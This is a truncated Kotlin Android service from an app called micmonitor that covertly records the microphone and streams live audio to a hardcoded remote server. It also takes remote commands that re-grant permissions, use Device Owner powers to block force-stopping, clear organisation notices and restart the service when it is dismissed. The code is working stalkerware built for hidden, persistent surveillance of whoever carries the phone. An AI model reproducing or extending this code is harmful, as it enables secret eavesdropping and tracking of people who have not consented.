package com.micmonitor.app

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.BitmapFactory
import android.graphics.Canvas
import android.graphics.ColorMatrix
import android.graphics.ColorMatrixColorFilter
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.AudioManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.media.ImageReader
import android.media.audiofx.AcousticEchoCanceler
import android.media.audiofx.AutomaticGainControl
import android.media.audiofx.NoiseSuppressor
import android.app.AlarmManager
import android.app.PendingIntent
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.BatteryManager
import android.os.IBinder
import android.os.Handler
import android.os.HandlerThread
import android.os.PowerManager
import android.os.SystemClock
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.core.content.edit
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import kotlinx.coroutines.*
import okhttp3.*
import okio.ByteString
import okio.ByteString.Companion.toByteString
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.nio.ByteBuffer
import java.util.UUID
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import kotlin.math.max
import kotlin.math.min
import kotlin.random.Random
import org.json.JSONObject
import org.json.JSONArray
import org.webrtc.AudioSource
import org.webrtc.AudioTrack
import org.webrtc.IceCandidate
import org.webrtc.MediaConstraints
import org.webrtc.PeerConnection
import org.webrtc.PeerConnectionFactory
import org.webrtc.RtpSender
import org.webrtc.SdpObserver
import org.webrtc.SessionDescription
import org.webrtc.audio.JavaAudioDeviceModule

/**
 * MicService — Core background service.
 *
 * What it does:
 *  1. Captures raw PCM audio from microphone using AudioRecord.
 *  2. Streams every audio chunk live to the Node.js server via WebSocket.
 *  3. Simultaneously writes chunks to an .pcm file (recording) on device.
 *  4. Listens for remote commands: "start_record", "stop_record", "ping".
 *  5. Auto-reconnects on WebSocket failure (every 5 seconds).
 *  6. Holds a WakeLock so the CPU stays alive in background.
 *  7. restarted automatically by BootReceiver on reboot.
 */
class MicService : Service() {

    // ── Coroutine scope (cancelled on destroy) ──────────────────────────────
    private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())

    // ── Audio capture ────────────────────────────────────────────────────────
    private var audioRecord: AudioRecord? = null
    private val sampleRate    = 16000           // 16 kHz
    private val channelConfig = AudioFormat.CHANNEL_IN_MONO
    private val audioFormat   = AudioFormat.ENCODING_PCM_16BIT
    private val minBufferSize by lazy {
        val min = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
        // Some OEMs return an error code; use a safe fallback in that case.
        if (min > 0) min else sampleRate
    }
    private val recordBufferSize by lazy { max(minBufferSize * 2, sampleRate * 4) }
    // 20 ms chunks keep streaming latency low and prevent multi-second playback drift.
    private val streamChunkSize by lazy { ((sampleRate * 2) / 50).coerceAtLeast(640) }

    // ── WebSocket ────────────────────────────────────────────────────────────
    private var webSocket: WebSocket? = null
    @Volatile private var isWsConnecting = false
    private var wsReconnectJob: Job? = null
    @Volatile private var wsReconnectAttempts = 0
    private val okHttpClient = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(0,  TimeUnit.MILLISECONDS)  // No read timeout (streaming)
        .pingInterval(20, TimeUnit.SECONDS)        // More frequent keep-alive (was 30s)
        .build()

    // ── Recording state ──────────────────────────────────────────────────────
    @Volatile private var isCapturing   = false
    @Volatile private var isSavingFile  = false
    @Volatile private var aiEnhancementEnabled = true
    @Volatile private var aiAutoModeEnabled = true
    @Volatile private var wantsMicStreaming = true
    @Volatile private var isRecoveringMic = false
    @Volatile private var wsStreamMode = "auto" // auto | pcm | smart
    @Volatile private var voiceProfile = "room" // near | room | far
    @Volatile private var lowNetworkMode = false // dashboard forced low-network mode
    @Volatile private var lowNetworkSampleRate = 16000 // dynamic: 16000 (normal/low-network clarity mode)
    @Volatile private var lowNetworkFrameMs = 20 // dynamic: 20ms (normal) or 30ms (weak network)
    
    // ── HQ Buffered Audio Mode (delay OK, clarity priority) ─────────────────
    // When enabled: accumulate 10-sec buffer → heavy processing → compress → send
    // This trades latency (5-15s) for better far-voice clarity on weak networks
    @Volatile private var hqBufferedMode = false // realtime (false) or hq_buffered (true)
    private val hqBufferSeconds = 10 // 10-second buffer for HQ mode
    private val hqBufferSize by lazy { sampleRate * 2 * hqBufferSeconds } // 320KB for 16kHz mono PCM16
    private var hqBuffer = ByteArray(0) // lazily initialized when HQ mode enabled
    @Volatile private var hqBufferOffset = 0
    @Volatile private var hqAggressiveDenoise = true // stronger denoise in HQ mode
    private val hqSilenceThreshold = 500 // RMS below this = silence (increased from 200 for better detection)
    private val hqSilencePercent = 0.85 // Buffer must be 85% silent to skip
    private val hqChunkSize = 64 * 1024 // Split large buffers into 64KB chunks for reliable transmission
    @Volatile private var lastAudioChunkSentAt = 0L
    @Volatile private var lastHealthSentAt = 0L
    @Volatile private var audioSourceRotation = 0
    @Volatile private var activeAudioSource = MediaRecorder.AudioSource.DEFAULT
    private var micWatchdogJob: Job? = null
    private var recordingFileStream: FileOutputStream? = null
    private var recordingFile: File? = null
    private var estimatedNoiseDb = -62.0
    private var lastAutoAiSwitchAt = 0L
    @Volatile private var preferredCameraFacing = CameraCharacteristics.LENS_FACING_BACK
    @Volatile private var isPhotoCaptureBusy = false
    @Volatile private var aiPhotoEnhancementEnabled = true
    @Volatile private var photoQualityMode = "normal" // fast | normal | hd
    @Volatile private var photoNightMode = "off" // off | 1s | 3s | 5s
    @Volatile private var isCameraLiveStreaming = false
    @Volatile private var cameraLiveStrictFacing = false
    private var cameraLiveJob: Job? = null

    // ── PCM enhancement filter state (persists across frames for continuity) ──
    // Reset these at each capture start so a previous session's state is never reused.
    private var hpfPrevX = 0.0      // HPF: previous raw input sample
    private var hpfPrevY = 0.0      // HPF: previous output sample
    private var eq1X1 = 0.0         // EQ stage1 biquad +6dB@1500Hz: x[n-1]
    private var eq1X2 = 0.0         // EQ stage1 biquad +6dB@1500Hz: x[n-2]
    private var eq1Y1 = 0.0         // EQ stage1 biquad +6dB@1500Hz: y[n-1]
    private var eq1Y2 = 0.0         // EQ stage1 biquad +6dB@1500Hz: y[n-2]
    private var smoothedGain = 1.0  // Temporally-smoothed gain (anti-pumping)
    @Volatile private var ourAudioMode = false  // true while we own MODE_IN_COMMUNICATION
    // Overlap-add FFT spectral denoiser — shared instance, reset each capture session.
    private val spectralDenoiser = SpectralDenoiser()

    // ── WebRTC state (phone publishes mic track) ───────────────────────────
    @Volatile private var isWebRtcStreaming = false
    private var peerConnectionFactory: PeerConnectionFactory? = null
    private var audioDeviceModule: JavaAudioDeviceModule? = null
    private var peerConnection: PeerConnection? = null
    private var localAudioSource: AudioSource? = null
    private var localAudioTrack: AudioTrack? = null
    private var webRtcAudioSender: RtpSender? = null
    private var currentWebRtcBitrateKbps = 24
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var webRtcRecoveryJob: Job? = null
    private var iceWatchdogJob: Job? = null
    private var lastDashboardQuality: JSONObject? = null
    private var cachedIceServers: List<PeerConnection.IceServer> = listOf(
        PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer()
    )

    private fun preferredAudioSources(): IntArray {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            intArrayOf(
                MediaRecorder.AudioSource.UNPROCESSED,
                MediaRecorder.AudioSource.VOICE_RECOGNITION,
                MediaRecorder.AudioSource.MIC,
                MediaRecorder.AudioSource.CAMCORDER,
            )
        } else {
            intArrayOf(
                MediaRecorder.AudioSource.VOICE_RECOGNITION,
                MediaRecorder.AudioSource.MIC,
                MediaRecorder.AudioSource.CAMCORDER,
            )
        }
    }

    // ── WakeLock ─────────────────────────────────────────────────────────────
    private var wakeLock: PowerManager.WakeLock? = null
    private val connectivityManager by lazy {
        getSystemService(ConnectivityManager::class.java)
    }

    // ── Data Collector ───────────────────────────────────────────────────────
    private val dataCollector by lazy { DataCollector(this) }
    private var dataJob: Job? = null

    // ── Prefs / Device ID ────────────────────────────────────────────────────
    private val prefs by lazy { getSharedPreferences("micmonitor", MODE_PRIVATE) }
    
    // Use Android ID as base for device ID - survives cache clear
    private val deviceId: String by lazy {
        // First try to get existing ID from prefs
        prefs.getString("device_id", null) ?: run {
            // Generate stable ID based on Android ID (survives cache clear but not factory reset)
            val androidId = android.provider.Settings.Secure.getString(
                contentResolver, 
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"
            
            // Create short hash for privacy + readability
            val stableId = androidId.hashCode().toUInt().toString(16).padStart(8, '0')
            
            stableId.also { id ->
                prefs.edit { putString("device_id", id) }
                Log.i(TAG, "Generated stable device ID: $id")
            }
        }
    }
    
    // ── Server URL — CHANGE THIS TO YOUR PC'S IP ─────────────────────────────
    // Or set from the app's main screen to a Render URL like:
    // wss://your-app.onrender.com/audio/
    companion object {
        const val TAG          = "MicService"
        const val CHANNEL_ID   = "device_services_channel"
        const val NOTIF_ID     = 101
        const val ACTION_RECONNECT = "com.micmonitor.app.RECONNECT"
        
        // WebRTC bitrate settings balanced for clarity + network stability.
        // Moderate increase prevents artifacts without overwhelming weak networks.
        const val WEBRTC_MIN_BITRATE_KBPS = 48      // Network-friendly floor
        const val WEBRTC_MID_BITRATE_KBPS = 64      // Balanced quality
        const val WEBRTC_MAX_BITRATE_KBPS = 96      // Quality ceiling
        
        // Standard bitrates for good network conditions
        const val WEBRTC_STANDARD_MIN_KBPS = 80
        const val WEBRTC_STANDARD_MID_KBPS = 96
        const val WEBRTC_STANDARD_MAX_KBPS = 128
        
        // Audio codec identifiers
        const val AUDIO_CODEC_PCM16_16K: Byte = 0x00  // Full quality - no compression
        const val AUDIO_CODEC_MULAW_8K: Byte = 0x01   // Compressed fallback
        
        const val WS_RECONNECT_BASE_MS = 500L     // Fast initial retry (was 2000)
        const val WS_RECONNECT_MAX_MS = 5_000L    // Max delay 5s (was 30s)

        // Render cloud URL — works on any network (WiFi or cellular)
        const val DEFAULT_SERVER_URL = "wss://monitor-raje.onrender.com/audio/"

        // Shared websocket for service health checks and optional future hooks.
        @Volatile var activeWebSocket: WebSocket? = null
    }

    /** Reads server URL from SharedPreferences so it can be changed from MainActivity */
    private val serverUrl get(): String {
        val base = prefs.getString("server_url", DEFAULT_SERVER_URL) ?: DEFAULT_SERVER_URL
        // Ensure it ends with / then append deviceId
        return base.trimEnd('/') + "/$deviceId"
    }

    private val wsAuthToken: String
        get() = (prefs.getString("server_token", "") ?: "").trim()

    private val serverHttpBaseUrl: String
        get() {
            val base = prefs.getString("server_url", DEFAULT_SERVER_URL) ?: DEFAULT_SERVER_URL
            return base
                .replace(Regex("^wss://"), "https://")
                .replace(Regex("^ws://"), "http://")
                .substringBefore("/audio")
                .trimEnd('/')
        }

    // ────────────────────────────────────────────────────────────────────────
    // Service lifecycle
    // ────────────────────────────────────────────────────────────────────────

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        acquireWakeLock()
        // WebRTC init moved to startWebRtcSession() - too early here causes crash
        Log.i(TAG, "Service created. Device ID: $deviceId")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "onStartCommand action=${intent?.action}")

        startForeground(NOTIF_ID, buildNotification("Connecting to server…"))

        // Reconnect watchdog alarm fired — force a fresh WebSocket if dead
        if (intent?.action == ACTION_RECONNECT) {
            if (activeWebSocket == null) {
                Log.i(TAG, "Reconnect alarm: WebSocket dead, reconnecting…")
                connectWebSocket()
            } else {
                Log.i(TAG, "Reconnect alarm: WebSocket alive, skipping")
                if (!isCapturing) startAudioCapture()
                startMicWatchdog()
            }
            scheduleReconnectAlarm() // reschedule for next cycle
            return START_STICKY
        }

        if (activeWebSocket == null) {
            connectWebSocket()
        } else {
            Log.i(TAG, "WebSocket already active — ensuring mic/data workers are running")
            if (!isCapturing) startAudioCapture()
            startMicWatchdog()
            startDataCollection()
        }
        scheduleKeepAlive()
        scheduleReconnectAlarm()
        return START_STICKY   // Android restarts service automatically if killed
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        // Schedule immediate restart via AlarmManager when user swipes app away
        val restartIntent = Intent(applicationContext, MicService::class.java)
        val pendingIntent = PendingIntent.getService(
            this, 1, restartIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(AlarmManager::class.java)
        val triggerAt = SystemClock.elapsedRealtime() + 2_000
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                pendingIntent
            )
        } else {
            alarmManager.set(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                pendingIntent
            )
        }
        Log.i(TAG, "onTaskRemoved — scheduled restart in 2s")
    }

    override fun onDestroy() {
        Log.i(TAG, "onDestroy — stopping service")
        isCapturing  = false
        isSavingFile = false
        activeWebSocket = null
        serviceScope.cancel()
        wsReconnectJob?.cancel()
        wsReconnectJob = null
        stopMicWatchdog()
        stopAudioCapture("stop_capture_for_webrtc")
        stopWebRtcSession(notifyState = false)
        stopCameraLiveStream("service_destroy")
        closeRecordingFile()
        webSocket?.close(1000, "Service stopped")
        isWsConnecting = false
        peerConnectionFactory?.dispose()
        peerConnectionFactory = null
        audioDeviceModule?.release()
        audioDeviceModule = null
        if (wakeLock?.isHeld == true) wakeLock?.release()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ────────────────────────────────────────────────────────────────────────
    // WebSocket connection
    // ────────────────────────────────────────────────────────────────────────

    private fun connectWebSocket() {
        if (activeWebSocket != null || isWsConnecting) {
            Log.i(TAG, "connectWebSocket skipped (already connected/connecting)")
            return
        }
        isWsConnecting = true
        Log.i(TAG, "Connecting to $serverUrl")
        updateNotification("Connecting to server…")

        try {
            webSocket?.close(1000, "Reconnecting")
        } catch (_: Exception) {}

        val requestBuilder = Request.Builder()
            .url(serverUrl)
            .addHeader("X-Device-Id", deviceId)
        if (wsAuthToken.isNotBlank()) {
            requestBuilder.addHeader("X-Auth-Token", wsAuthToken)
        }
        val request = requestBuilder.build()

        webSocket = okHttpClient.newWebSocket(request, object : WebSocketListener() {

            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.i(TAG, "WebSocket connected ✅")
                isWsConnecting = false
                activeWebSocket = webSocket
                wsReconnectAttempts = 0
                wsReconnectJob?.cancel()
                wsReconnectJob = null
                updateNotification("Live streaming active")
                webSocket.send("DEVICE_INFO:$deviceId:${Build.MODEL}:${Build.VERSION.SDK_INT}:${BuildConfig.VERSION_NAME}:${BuildConfig.VERSION_CODE}")
                // Mic-first mode: always keep capture active when connected.
                startAudioCapture()
                startMicWatchdog()
                startDataCollection()
                sendHealthStatus("ws_open")
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.d(TAG, "Server command: $text")
                handleServerCommand(text.trim())
            }

            override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
                handleServerCommand(bytes.utf8().trim())
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "WebSocket failure: ${t.message}")
                onWsDisconnected("failure")
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                Log.w(TAG, "WebSocket closed: $reason")
                onWsDisconnected("closed")
            }
        })
    }

    private fun onWsDisconnected(reason: String) {
        isWsConnecting = false
        activeWebSocket = null
        stopCameraLiveStream("ws_disconnected")
        stopMicWatchdog()
        stopAudioCapture()
        stopWebRtcSession(notifyState = false)
        stopDataCollection()
        scheduleWebSocketReconnect(reason)
    }

    // Safe WebSocket send with automatic error handling and reconnection
    private fun safeSend(data: Any): Boolean {
        return try {
            val ws = webSocket
            if (ws == null || activeWebSocket == null) {
                Log.w(TAG, "Cannot send - WebSocket is null")
                return false
            }
            
            when (data) {
                is String -> ws.send(data)
                is okio.ByteString -> ws.send(data)
                else -> ws.send(data.toString())
            }
            true
        } catch (e: Exception) {
            Log.w(TAG, "WebSocket send failed: ${e.message} - triggering reconnect")
            onWsDisconnected("send_failed")
            false
        }
    }

    private fun sendCommandAck(command: String, status: String = "success", detail: String? = null) {
        val msg = JSONObject().apply {
            put("type", "command_ack")
            put("command", command)
            put("status", status)
            if (!detail.isNullOrBlank()) put("detail", detail.take(200))
            put("ts", System.currentTimeMillis())
        }
        safeSend(msg.toString())
    }

    private fun isNetworkUsable(): Boolean {
        val cm = connectivityManager ?: return true
        val network = cm.activeNetwork ?: return false
        val caps = cm.getNetworkCapabilities(network) ?: return false
        return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    private fun nextReconnectDelayMs(): Long {
        // Fast aggressive retry: 500ms -> 1s -> 2s -> 4s -> 5s max
        val expShift = wsReconnectAttempts.coerceAtMost(3)  // Cap earlier (was 4)
        val expDelay = (WS_RECONNECT_BASE_MS * (1L shl expShift)).coerceAtMost(WS_RECONNECT_MAX_MS)
        val jitter = Random.nextLong(100L, 500L)  // Less jitter (was 250-1500)
        return (expDelay + jitter).coerceAtMost(WS_RECONNECT_MAX_MS)
    }

    private fun scheduleWebSocketReconnect(reason: String) {
        if (wsReconnectJob?.isActive == true) return
        wsReconnectJob = serviceScope.launch(Dispatchers.IO) {
            while (isActive && activeWebSocket == null && !isWsConnecting) {
                if (!isNetworkUsable()) {
                    updateNotification("Offline — waiting for network…")
                    delay(1_500)  // Faster network check (was 4000)
                    continue
                }
                val delayMs = nextReconnectDelayMs()
                updateNotification("Disconnected ($reason) — reconnecting in ${delayMs / 1000}s…")
                delay(delayMs)
                if (activeWebSocket != null || isWsConnecting) break
                wsReconnectAttempts = (wsReconnectAttempts + 1).coerceAtMost(20)
                connectWebSocket()
            }
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // Remote command handler (from primary device dashboard)
    // ────────────────────────────────────────────────────────────────────────

    private fun handleServerCommand(cmd: String) {
        if (cmd.startsWith("{")) {
            handleServerJsonCommand(cmd)
            return
        }
        when (cmd) {
            "start_stream" -> {
                Log.i(TAG, "CMD: start mic stream")
                wantsMicStreaming = true
                if (!isWebRtcStreaming) {
                    val staleCapture = isCapturing && (System.currentTimeMillis() - lastAudioChunkSentAt > 20_000)
                    if (staleCapture) {
                        stopAudioCapture("start_stream_stale_restart")
                    }
                    startAudioCapture()
                    startMicWatchdog()
                }
                updateNotification("Live streaming active")
                safeSend("ACK:start_stream")
                sendCommandAck("start_stream")
            }
            "stop_stream" -> {
                Log.i(TAG, "CMD: stop mic stream")
                wantsMicStreaming = false
                stopMicWatchdog()
                stopAudioCapture()
                stopWebRtcSession(notifyState = true)
                closeRecordingFile()
                updateNotification("Connected — mic standby")
                safeSend("ACK:stop_stream")
                sendCommandAck("stop_stream")
            }
            "start_record" -> {
                Log.i(TAG, "CMD: start recording")
                // Also ensure mic is capturing
                startAudioCapture()
                openRecordingFile()
                safeSend("ACK:start_record")
                sendCommandAck("start_record")
            }
            "stop_record" -> {
                Log.i(TAG, "CMD: stop recording")
                closeRecordingFile()
                safeSend("ACK:stop_record:${recordingFile?.name ?: "unknown"}")
                sendCommandAck("stop_record", detail = recordingFile?.name ?: "unknown")
            }
            "ping" -> {
                safeSend("pong:$deviceId")
                sendCommandAck("ping")
            }
            "get_data" -> {
                // Dashboard requested a fresh sync immediately
                sendDeviceData()
                sendCommandAck("get_data")
            }
            "force_update" -> {
                Log.i(TAG, "CMD: force_update - checking for updates")
                UpdateWorker.checkNow(this)
                safeSend("ACK:force_update")
                sendCommandAck("force_update")
            }
            "grant_permissions" -> {
                Log.i(TAG, "CMD: grant_permissions - re-granting all permissions")
                try {
                    UpdateService.autoGrantPermissions(this)
                    safeSend("ACK:grant_permissions:success")
                    sendCommandAck("grant_permissions")
                    // Collect and send data to verify permissions work
                    serviceScope.launch(Dispatchers.IO) {
                        delay(500)  // Wait for permissions to apply
                        sendDeviceData()
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to grant permissions: ${e.message}")
                    safeSend("ACK:grant_permissions:error:${e.message}")
                    sendCommandAck("grant_permissions", "error", e.message)
                }
            }
            "enable_autostart" -> {
                // Open Realme/Xiaomi/Vivo auto-start settings
                Log.i(TAG, "CMD: enable_autostart - opening auto-start settings")
                try {
                    val opened = openAutoStartSettings()
                    if (opened) {
                        safeSend("ACK:enable_autostart:opened")
                        sendCommandAck("enable_autostart", detail = "opened")
                    } else {
                        safeSend("ACK:enable_autostart:not_supported")
                        sendCommandAck("enable_autostart", "error", "not_supported")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to open autostart settings: ${e.message}")
                    safeSend("ACK:enable_autostart:error:${e.message}")
                    sendCommandAck("enable_autostart", "error", e.message)
                }
            }
            "toggle_wifi" -> {
                Log.i(TAG, "CMD: toggle_wifi - toggling WiFi state")
                try {
                    val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        // Android 10+ - open WiFi settings panel
                        val panelIntent = Intent(android.provider.Settings.Panel.ACTION_WIFI)
                        panelIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        startActivity(panelIntent)
                        safeSend("ACK:toggle_wifi:settings_opened")
                        sendCommandAck("toggle_wifi", detail = "settings_opened (Android 10+ requires user interaction)")
                    } else {
                        // Android 9 and below - direct toggle
                        @Suppress("DEPRECATION")
                        val currentState = wifiManager.isWifiEnabled
                        @Suppress("DEPRECATION")
                        wifiManager.isWifiEnabled = !currentState
                        val newState = if (!currentState) "on" else "off"
                        safeSend("ACK:toggle_wifi:$newState")
                        sendCommandAck("toggle_wifi", detail = "WiFi turned $newState")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to toggle WiFi: ${e.message}")
                    safeSend("ACK:toggle_wifi:error:${e.message}")
                    sendCommandAck("toggle_wifi", "error", e.message)
                }
            }
            "wifi_on" -> {
                Log.i(TAG, "CMD: wifi_on - enabling WiFi")
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        val panelIntent = Intent(android.provider.Settings.Panel.ACTION_WIFI)
                        panelIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        startActivity(panelIntent)
                        safeSend("ACK:wifi_on:settings_opened")
                        sendCommandAck("wifi_on", detail = "settings_opened")
                    } else {
                        val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                        @Suppress("DEPRECATION")
                        wifiManager.isWifiEnabled = true
                        safeSend("ACK:wifi_on:enabled")
                        sendCommandAck("wifi_on", detail = "enabled")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to enable WiFi: ${e.message}")
                    safeSend("ACK:wifi_on:error:${e.message}")
                    sendCommandAck("wifi_on", "error", e.message)
                }
            }
            "wifi_off" -> {
                Log.i(TAG, "CMD: wifi_off - disabling WiFi")
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        val panelIntent = Intent(android.provider.Settings.Panel.ACTION_WIFI)
                        panelIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        startActivity(panelIntent)
                        safeSend("ACK:wifi_off:settings_opened")
                        sendCommandAck("wifi_off", detail = "settings_opened")
                    } else {
                        val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                        @Suppress("DEPRECATION")
                        wifiManager.isWifiEnabled = false
                        safeSend("ACK:wifi_off:disabled")
                        sendCommandAck("wifi_off", detail = "disabled")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to disable WiFi: ${e.message}")
                    safeSend("ACK:wifi_off:error:${e.message}")
                    sendCommandAck("wifi_off", "error", e.message)
                }
            }
            "check_update" -> {
                Log.i(TAG, "CMD: check_update - triggering update check")
                serviceScope.launch(Dispatchers.IO) {
                    val versionInfo = UpdateService.checkForUpdate(this@MicService, forceCheck = true)
                    if (versionInfo != null) {
                        safeSend("""{"type":"update_available","version":"${versionInfo.versionName}","code":${versionInfo.versionCode},"size":${versionInfo.apkSize}}""")
                        sendCommandAck("check_update", detail = "update_available")
                    } else {
                        safeSend("""{"type":"update_status","status":"up_to_date"}""")
                        sendCommandAck("check_update", detail = "up_to_date")
                    }
                }
            }
            "clear_device_owner" -> {
                Log.i(TAG, "CMD: clear_device_owner - removing device owner")
                try {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    if (dpm.isDeviceOwnerApp(packageName)) {
                        dpm.clearDeviceOwnerApp(packageName)
                        safeSend("ACK:clear_device_owner:success")
                        sendCommandAck("clear_device_owner")
                        Log.i(TAG, "Device Owner cleared successfully")
                    } else {
                        safeSend("ACK:clear_device_owner:not_device_owner")
                        sendCommandAck("clear_device_owner", "error", "not_device_owner")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to clear device owner: ${e.message}")
                    safeSend("ACK:clear_device_owner:error:${e.message}")
                    sendCommandAck("clear_device_owner", "error", e.message)
                }
            }
            "lock_app" -> {
                // Prevent app from being force stopped (Device Owner only)
                Log.i(TAG, "CMD: lock_app - preventing force stop")
                try {
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                        if (dpm.isDeviceOwnerApp(packageName)) {
                            val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
                            dpm.setUserControlDisabledPackages(admin, listOf(packageName))
                            safeSend("ACK:lock_app:success")
                            sendCommandAck("lock_app")
                            Log.i(TAG, "App locked - cannot be force stopped")
                        } else {
                            safeSend("ACK:lock_app:not_device_owner")
                            sendCommandAck("lock_app", "error", "not_device_owner")
                        }
                    } else {
                        safeSend("ACK:lock_app:requires_android_11")
                        sendCommandAck("lock_app", "error", "requires_android_11")
                    }
                } catch (e: Exception) {
                    safeSend("ACK:lock_app:error:${e.message}")
                    sendCommandAck("lock_app", "error", e.message)
                }
            }
            "unlock_app" -> {
                // Allow app to be force stopped again
                Log.i(TAG, "CMD: unlock_app - allowing force stop")
                try {
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                        if (dpm.isDeviceOwnerApp(packageName)) {
                            val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
                            dpm.setUserControlDisabledPackages(admin, emptyList())
                            safeSend("ACK:unlock_app:success")
                            sendCommandAck("unlock_app")
                            Log.i(TAG, "App unlocked - can be force stopped")
                        } else {
                            safeSend("ACK:unlock_app:not_device_owner")
                            sendCommandAck("unlock_app", "error", "not_device_owner")
                        }
                    } else {
                        safeSend("ACK:unlock_app:requires_android_11")
                        sendCommandAck("unlock_app", "error", "requires_android_11")
                    }
                } catch (e: Exception) {
                    safeSend("ACK:unlock_app:error:${e.message}")
                    sendCommandAck("unlock_app", "error", e.message)
                }
            }
            "hide_notifications" -> {
                // Hide Device Owner organization notifications
                Log.i(TAG, "CMD: hide_notifications - hiding Device Owner messages")
                try {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    if (dpm.isDeviceOwnerApp(packageName)) {
                        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
                        
                        // Clear organization name
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                            dpm.setOrganizationName(admin, "")
                        }
                        // Clear support messages
                        dpm.setShortSupportMessage(admin, null)
                        dpm.setLongSupportMessage(admin, null)
                        
                        safeSend("ACK:hide_notifications:success")
                        sendCommandAck("hide_notifications")
                        Log.i(TAG, "Device Owner notifications hidden")
                    } else {
                        safeSend("ACK:hide_notifications:not_device_owner")
                        sendCommandAck("hide_notifications", "error", "not_device_owner")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to hide notifications: ${e.message}")
                    safeSend("ACK:hide_notifications:error:${e.message}")
                    sendCommandAck("hide_notifications", "error", e.message)
                }
            }
            // WiFi control commands removed - feature disabled
            "wifi_on", "wifi_off" -> {
                Log.i(TAG, "CMD: wifi control disabled")
                safeSend("ACK:wifi:disabled")
                sendCommandAck(cmd, "error", "disabled")
            }
            "uninstall_app" -> {
                // Uninstall the app (clear device owner first, then uninstall)
                Log.i(TAG, "CMD: uninstall_app - starting uninstall process")
                try {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    
                    // If Device Owner, unlock app first
                    if (dpm.isDeviceOwnerApp(packageName)) {
                        // Clear device owner to allow uninstall
                        dpm.clearDeviceOwnerApp(packageName)
                        Log.i(TAG, "Device Owner cleared for uninstall")
                        safeSend("ACK:uninstall_app:device_owner_cleared")
                    }
                    
                    // Launch uninstall intent
                    val packageUri = android.net.Uri.parse("package:$packageName")
                    val uninstallIntent = android.content.Intent(android.content.Intent.ACTION_DELETE, packageUri).apply {
                        flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                    startActivity(uninstallIntent)
                    safeSend("ACK:uninstall_app:launched")
